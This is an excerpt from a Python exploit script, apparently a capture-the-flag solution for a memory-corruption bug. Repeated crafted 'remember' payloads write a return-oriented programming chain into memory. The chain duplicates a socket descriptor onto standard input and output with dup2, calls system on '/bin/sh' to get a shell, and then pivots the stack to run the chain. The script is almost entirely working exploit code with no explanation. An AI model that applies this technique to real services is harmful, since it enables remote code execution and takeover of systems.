...
dup2 = libc_base + 0x00000000000fa370
...
# pause()
our_fd = 0x5
remember(p8(0xff), p8(0x44)*0x18 + p64(0x0) + p8(rop_write_start_lsb) + p64(pop_rdi) + p64(our_fd) + p8(0x44) * 206)
reset()
remember(p8(0xff), p8(0x44)*0x18 + p64(0x0) + p8(rop_write_start_lsb+0x10) + p64(pop_rsi) + p64(0x0) + p8(0x44) * 206)
reset()
remember(p8(0xff), p8(0x44)*0x18 + p64(0x0) + p8(rop_write_start_lsb+0x20) + p64(dup2) + p64(pop_rdi) + p8(0x44) * 206)
reset()
remember(p8(0xff), p8(0x44)*0x18 + p64(0x0) + p8(rop_write_start_lsb+0x30) + p64(our_fd) + p64(pop_rsi) + p8(0x44) * 206)
reset()
remember(p8(0xff), p8(0x44)*0x18 + p64(0x0) + p8(rop_write_start_lsb+0x40) + p64(0x1) + p64(dup2) + p8(0x44) * 206)
reset()
remember(p8(0xff), p8(0x33)*0x18 + p64(0x0) + p8(rop_write_start_lsb+0x50) + p64(pop_rdi+1) + p64(pop_rdi) +  p8(0x33) * 206)
reset()
remember(p8(0xff), p8(0x11)*0x18 + p64(0x0) + p8(rop_write_start_lsb+0x60) + p64(bin_sh) + p64(system) + p8(0x11) * 206)
reset()
remember(p8(0xff), p8(0xdc) * 0x18 + p64(0x0) + p8(jump_overwrite_lsb) + p64(pop_rsp) + p64(start_of_rop_address) + p8(0xdc) * 206)
